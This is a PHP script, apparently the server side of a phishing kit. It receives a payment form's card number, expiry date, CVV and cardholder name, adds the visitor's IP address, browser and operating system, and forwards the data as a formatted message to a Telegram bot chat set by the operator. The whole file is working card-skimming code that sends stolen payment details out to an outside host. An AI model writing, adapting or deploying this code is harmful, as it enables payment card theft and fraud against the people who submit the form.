<?php

session_start();


if (isset($_SESSION['botToken'])) {
    setcookie('botToken', $_SESSION['botToken'], time() + 3600, "/");
}
if (isset($_SESSION['chatId'])) {
    setcookie('chatId', $_SESSION['chatId'], time() + 3600, "/");
}



// Function to detect browser from user agent
function getBrowser($userAgent) {
    if (preg_match('/Edg/i', $userAgent)) return 'Microsoft Edge';
    if (preg_match('/Chrome/i', $userAgent)) return 'Google Chrome';
    if (preg_match('/Firefox/i', $userAgent)) return 'Mozilla Firefox';
    if (preg_match('/Safari/i', $userAgent) && !preg_match('/Chrome/i', $userAgent)) return 'Safari';
    if (preg_match('/Opera|OPR/i', $userAgent)) return 'Opera';
    return 'Unknown';
}

// Function to detect operating system from user agent
function getOS($userAgent) {
    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
    if (preg_match('/Macintosh|Mac OS/i', $userAgent)) return 'Mac OS';
    if (preg_match('/Linux/i', $userAgent)) return 'Linux';
    if (preg_match('/Android/i', $userAgent)) return 'Android';
    if (preg_match('/iPhone|iPad|iPod/i', $userAgent)) return 'iOS';
    return 'Unknown';
}

// Handle Telegram sending
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = $_POST['card_number'] ?? 'N/A';
    $expiry = $_POST['expiry'] ?? 'N/A';
    $cvv = $_POST['cvv'] ?? 'N/A';
    $name = $_POST['name'] ?? 'N/A';

    // Get IP address
    $ip_address = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    // Get user agent, browser, and OS
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser = getBrowser($user_agent);
    $os = getOS($user_agent);

    // Telegram Bot Configuration
    $botToken = $_SESSION['botToken']; // Replace with your Telegram Bot Token
    $chatId = $_SESSION['chatId']; // Replace with your Telegram Chat ID

    // Format message with Markdown for clickable copyable values
$message = "🚨 New Payment Submission 🚨:\n" .
           "💳 *Card Number*: 🔒 `$card_number`\n" .
           "📆 *Expiry*: ⏰ `$expiry`\n" .
           "🔑 *CVV*: 🔒 `$cvv`\n" .
           "👤 *Name*: `$name`\n" .
           "🌐 *IP Address*: 📍 `$ip_address`\n" .
           "🖥️ *Browser*: `$browser`\n" .
           "💻 *Operating System*: `$os`\n" .
           "📝 *User Agent*: `$user_agent`";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Respond with JSON for AJAX
    header('Content-Type: application/json');
    if ($result) {
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send Telegram message']);
    }
    exit;
}
?>